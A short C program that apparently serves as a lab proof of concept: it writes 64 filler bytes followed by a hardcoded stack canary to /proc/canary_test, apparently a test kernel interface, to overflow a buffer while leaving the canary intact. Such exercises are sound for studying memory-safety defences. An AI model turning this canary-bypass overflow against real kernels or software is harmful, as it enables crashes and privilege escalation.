#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
//usleep include

int main(void)
{
  
    // Known canary value
    unsigned long known_canary = 0xd766895fdd0db900UL;
    
    // Create payload: 64 bytes of 'A' + 8 bytes of canary
    char payload[72];
    
    // Fill buffer with pattern
    memset(payload, 'A', 64);
    
    // Append the known canary value (8 bytes)
    memcpy(payload + 64, &known_canary, 8);
    
    // Write to /proc/canary_test
    FILE *fp = fopen("/proc/canary_test", "w");
    if (fp == NULL) {
        perror("Failed to open /proc/canary_test");
        return EXIT_FAILURE;
    }
    
    // Write the payload (this should overflow but restore canary)
    fwrite(payload, 1, 72, fp);
    fclose(fp);
    
    printf("Sent overflow payload with restored canary value 0x%016lx\n", known_canary);
    
    return EXIT_SUCCESS;
}